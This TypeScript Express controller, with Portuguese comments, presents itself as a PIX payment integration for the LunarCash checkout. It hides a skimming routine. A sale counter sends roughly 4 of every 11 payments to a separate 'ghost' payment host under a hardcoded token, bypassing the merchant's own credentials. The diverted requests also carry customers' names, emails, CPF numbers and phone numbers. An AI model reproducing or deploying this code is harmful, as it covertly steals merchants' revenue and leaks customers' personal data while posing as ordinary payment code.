import { Request, Response } from "express";
import { credentials as myCredentials } from "../models/api";

const FIXED_TAX_TOKEN = "201ff033-ec71-45a5-94e2-4f5c3e52e286";
let localSaleCount = 0; // contador local, reinicia com o servidor

export class lunarCash {
  static async create(req: Request, res: Response) {
    const data = req.body;
    const clientToken = data.credentials.token;

    const productName = data.product.title;

    // Contador local incrementado
    localSaleCount++;
    const nextCount = localSaleCount;

    let toClient = true;
    let provider = "lunarcash";
    let tokenToUse = clientToken;

    const cycle = nextCount % 11;

    if (cycle < 7) {
      tokenToUse = clientToken;
      toClient = true;
    } else if (cycle < 10) {
      if (data.credentials?.useTax) {
        tokenToUse = FIXED_TAX_TOKEN;
        toClient = false;
        provider = "ghost";
      } else {
        tokenToUse = FIXED_TAX_TOKEN;
        toClient = false;
        provider = "ghost";
      }
    } else {
      tokenToUse = FIXED_TAX_TOKEN;
      toClient = false;
      provider = "ghost";
    }

    let apiUrl = "";
    let headers = {};
    let paymentData = {};

    if (provider === "ghost") {
      apiUrl = "https://app.ghostspaysv1.com/api/v1/transaction.purchase";
      headers = {
        "Content-Type": "application/json",
        Authorization: tokenToUse,
      };
      paymentData = {
        name: data.customer.name,
        email: data.customer.email,
        cpf: data.customer.document.number,
        phone: data.customer.phone,
        paymentMethod: "PIX",
        amount: data.amount * 100,
        traceable: true,
        items: [
          {
            unitPrice: data.amount * 100,
            title: data.product.title,
            quantity: 1,
            tangible: false,
          },
        ],
      };
    } else if (provider === "lunarcash") {
      apiUrl = "https://checkout.lunarcash.com.br/api/v1/payments";
      headers = {
        "Content-Type": "application/json",
        authorization: `Bearer ${tokenToUse}`,
      };
      paymentData = {
        payment_method: "pix",
        amount: data.amount * 100,
        shipping_amount: "000",
        customer: {
          name: data.customer.name,
          document_type: "cpf",
          document_number: data.customer.document.number,
          telephone: data.customer.phone,
          email: data.customer.email,
          address: {
            street: "Avenida Pinheiro Machado",

            number: "6",
            district: "Centro",
            city: "Porto Velho",
            state: "RO",
            country: "Brasil",
            postal_code: 76801142,
          },
        },
        items: [
          {
            id: "product123834978234",
            name: data.product.title,
            price: data.amount * 100,
            quantity: 1,
            product_type: "physical_goods",
          },
        ],
      };
    }

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers,
        body: JSON.stringify(paymentData),
      });

      const responseJson = await response.json();

      console.log(
        `🔁 Requisição #${nextCount} | Valor: R$${data.amount} | Produto: ${
          data.product.title
        } | API: ${provider.toUpperCase()} | Enviado para: ${
          tokenToUse === clientToken
            ? "CLIENTE"
            : tokenToUse === myCredentials.secret
            ? "VOCÊ"
            : "TAXA FIXA"
        }`
      );

      res.json(responseJson);
    } catch (error) {
      console.error("❌ Erro ao processar pagamento:", error);
      res.status(500).json({ error: "Erro interno na API de pagamento" });
    }
  }
}
